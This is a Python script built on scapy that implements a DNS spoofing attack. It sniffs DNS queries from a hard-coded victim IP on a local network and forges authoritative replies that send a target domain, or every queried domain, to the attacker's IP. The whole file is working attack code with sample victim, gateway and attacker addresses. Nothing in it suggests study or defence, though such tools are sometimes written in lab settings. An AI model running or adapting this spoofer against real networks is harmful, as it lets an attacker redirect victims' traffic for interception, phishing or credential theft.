from scapy.all import ARP, Ether, send, sniff, srp
from scapy.layers.dns import DNS,DNSQR,DNSRR,UDP,IP,TCP
class DNSSpoofer:
    def __init__(self,attacker_ip:str,victim_ip:str,domain=None,queue=None) -> None:
        self.attacker_ip = attacker_ip
        self.victim_ip = victim_ip

        self.domain = domain

        if queue :
            self.queue = queue
        else :
            self.queue = None
    
    def writeInQueue(self,message):
        if self.queue :
            self.queue.put(message)

    def spit(self,pkt):
        """Spoof DNS responses for DNS queries."""
        if pkt.haslayer(DNS) and pkt[IP].src == self.victim_ip :
            qname = pkt[DNSQR].qname.decode()
       
            if self.domain :
               
                if self.domain.strip().lower() in qname :
                    dns_response = (
                        IP(dst=pkt[IP].src, src=pkt[IP].dst) /  # IP layer
                        UDP(dport=pkt[UDP].sport, sport=53) /  # UDP layer
                        DNS(
                            id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,  
                            an=DNSRR(rrname=qname, ttl=60, rdata=self.attacker_ip),  
                            ns=DNSRR(rrname=qname, ttl=60, rdata=self.attacker_ip),  
                        )
                    )
                    # Send the spoofed DNS response to the victim
                    send(dns_response, verbose=False)
                    self.writeInQueue(f"[+] Sent spoofed DNS response with IP {self.attacker_ip} for {qname}")
            else :
                dns_response = (
                        IP(dst=pkt[IP].src, src=pkt[IP].dst) /  # IP layer
                        UDP(dport=pkt[UDP].sport, sport=53) /  # UDP layer
                        DNS(
                            id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,  
                            an=DNSRR(rrname=qname, ttl=60, rdata=self.attacker_ip),  
                            ns=DNSRR(rrname=qname, ttl=60, rdata=self.attacker_ip),  
                        )
                    )
                # Send the spoofed DNS response to the victim
                send(dns_response, verbose=False)
                print(f"[+] Sent spoofed DNS response with IP {self.attacker_ip} for {qname}")

                
           
    
    def sniff(self):
        print('Starting DNS sniff...')
        sniff(filter="ip", prn=self.spit, store=0)

    def spoof(self):
        try:
            self.sniff()
        except KeyboardInterrupt:
            print("\nStopping DNS spoofing...")
            
if __name__ == "__main__":
    victim = {
        'ip' : '192.168.1.74',
        'mac' : "8:0:27:b4:97:59"
    }
    gtw = {
        'ip' : '192.168.1.254',
        'mac' : "80:ca:4b:ac:f3:3"
    }
    attacker = {
        'ip' : '192.168.1.73',
        'mac' : "ac:bc:32:91:0a:ad"
    }
    d = DNSSpoofer(attacker_ip=attacker.get('ip'),victim_ip=victim.get('ip'),domain="usthb")
    d.spoof()
